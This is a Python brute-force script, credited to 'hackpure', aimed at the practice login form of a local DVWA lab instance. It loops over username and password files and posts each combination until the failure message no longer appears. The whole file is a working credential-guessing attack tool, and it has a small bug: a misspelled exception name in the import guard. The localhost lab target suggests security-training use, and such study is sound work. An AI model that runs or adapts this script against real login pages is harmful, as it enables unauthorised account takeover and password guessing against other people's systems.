#!/usr/bin/python3
#File Imports

try:
	import requests
	from colorama import Fore
	from colorama import init as initializer
	import time
	import subprocess
except ModuleNotFOundError:
	print(Fore.RED + '[-] Kindly Run requirements.txt before Running this setup.py')
	time.sleep(1)
	exit()

#Display Warning

print(Fore.RED + '\n\t\t\t\t\t\t\t[!] WARNING [!]')
print(Fore.RED + 'You Must run setup.py and requirements.txt to satisfy the requirements of attack environment before running this script!')
time.sleep(5)

#Auto Reset Color = True

initializer(autoreset = True)

#Clear Terminal On Starting
clearTerminal = subprocess.call('clear', shell = True)

#Print Banner

def displayBanner():
	print(Fore.RED + ' __                     __   __       ___  ___      ___  __   __   __   ___')
	print(Fore.YELLOW + '|  \ \  / |  |  /\     |__) |__) |  |  |  |__  __  |__  /  \ |__) /  ` |__')
	print(Fore.BLUE + '|__/  \/  |/\| /~~\    |__) |  \ \__/  |  |___     |    \__/ |  \ \__, |___\n')
	print(Fore.RED + 'Developed By :- hackpure')
	print(Fore.RED + 'Github :- https://github.com/hackpure')

displayBanner()

#Attack Payload and AttackUrl

attackPayload = { 'username' : '', 'password' : '', 'Login' : 'submit'  }
attackUrl = 'http://127.0.0.1:42001/vulnerabilities/brute/'

#Username and Password Files

usernamesFile = open('attackFiles/user_attack.txt', 'r')
usernamesList = usernamesFile.readlines()
passwordsFile = open('attackFiles/password_list.txt', 'r')
passwordsList = passwordsFile.readlines()
currentUserIndex = 0
time.sleep(1)
print(Fore.BLUE + '\n[*] Starting Brute Force Attack...')
time.sleep(0.8)
print(Fore.BLUE + '[*] Using CLUSTER BOMB Approach\n')

#List Iteration Of Usernames and Passwords

for username in usernamesList:
	currentUser = username.strip("\n")
	for password in passwordsList:
		currentPassword = password.strip("\n")
		attackPayload['username'] = currentUser
		attackPayload['password'] = currentPassword
		attackResponse = requests.post(attackUrl, data = attackPayload)
		print(Fore.BLUE + f'[+] Attacking URL with Username : {Fore.YELLOW} {currentUser} {Fore.BLUE} and Password : {Fore.CYAN} {currentPassword}')
		if "Username and/or password incorrect.".encode() not in attackResponse.content:
			print(Fore.GREEN + "\n[+] Password Found\n")
			print(Fore.GREEN + f'Username ----> {currentUser} \nPassword ----> {currentPassword}\n\n')
			exit()
		else:
			print(Fore.RED + '[-] Wrong Password !')

	try:
		while currentUserIndex >= 0:
			nextUsername = usernamesList[currentUserIndex + 1].strip("\n")
			print(Fore.YELLOW + f'\nSwitching Current Username From {currentUser} to {nextUsername}\n')
			currentUserIndex += 1
			break
	except IndexError:
		print(Fore.RED + '\n\n[-] All Possible Combinations Of Username and Password Tried')

